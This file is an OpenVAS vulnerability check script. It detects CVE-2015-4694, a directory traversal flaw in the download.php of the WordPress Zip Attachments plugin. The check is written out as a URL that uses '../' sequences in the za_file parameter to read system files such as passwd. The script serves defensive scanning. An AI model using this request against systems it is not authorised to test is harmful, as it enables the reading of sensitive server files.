###############################################################################
# OpenVAS Vulnerability Test
#
# WordPress Zip Attachments Plugin 'download.php' Directory Traversal Vulnerability
#
# Authors:
# Rinu Kuriakose <krinu@secpod.com>
#
# Copyright:
# Copyright (C) 2016 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.807058");
  script_version("2023-03-01T10:20:05+0000");
  script_cve_id("CVE-2015-4694");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_tag(name:"last_modification", value:"2023-03-01 10:20:05 +0000 (Wed, 01 Mar 2023)");
  script_tag(name:"severity_vector", value:"CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N");
  script_tag(name:"severity_origin", value:"NVD");
  script_tag(name:"severity_date", value:"2016-11-28 19:29:00 +0000 (Mon, 28 Nov 2016)");
  script_tag(name:"creation_date", value:"2016-02-05 12:32:21 +0530 (Fri, 05 Feb 2016)");
  script_tag(name:"qod_type", value:"remote_vul");
  script_name("WordPress Zip Attachments Plugin 'download.php' Directory Traversal Vulnerability");

  script_tag(name:"summary", value:"The WordPress plugin 'Zip Attachments' is prone to a directory traversal vulnerability.");

  script_tag(name:"vuldetect", value:"Send a crafted data via HTTP GET request
  and check whether it is able to read arbitrary files or not.");

  script_tag(name:"insight", value:"The flaw is due to the insufficient
  validation of user supplied input via 'za_file' parameter in 'download.php'
  script.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote
  attackers to download arbitrary files and obtain sensitive information.");

  script_tag(name:"affected", value:"WordPress Zip Attachments plugin versions
  before 1.1.5");

  script_tag(name:"solution", value:"Update to version 1.1.5 or higher.");

  script_tag(name:"solution_type", value:"VendorFix");

  script_xref(name:"URL", value:"https://wpvulndb.com/vulnerabilities/8047");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/75211");
  script_xref(name:"URL", value:"http://www.openwall.com/lists/oss-security/2015/06/12/4");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2016 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_wordpress_http_detect.nasl", "os_detection.nasl");
  script_mandatory_keys("wordpress/http/detected");
  script_require_ports("Services/www", 80);
  script_xref(name:"URL", value:"https://wordpress.org/plugins/zip-attachments");
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");
include("os_func.inc");
include("misc_func.inc");

if(!port = get_app_port(cpe:CPE, service:"www"))
  exit(0);

if(!dir = get_app_location(cpe:CPE, port:port))
  exit(0);

if(dir == "/")
  dir = "";

files = traversal_files();

foreach pattern(keys(files)) {

  file = files[pattern];

  url = dir + '/wp-content/plugins/zip-attachments/download.php?za_file=../../../../../' + file+ '&za_filename=passwd';

  ## Not able to retrieve the content of zip file, i.e extra check is not possible
  if(http_vuln_check(port:port, url:url, check_header:TRUE,
     pattern:'Content-Disposition: attachment; filename="passwd\\.zip')) {
    report = http_report_vuln_url(port:port, url:url);
    security_message(port:port, data:report);
    exit(0);
  }
}

exit(99);
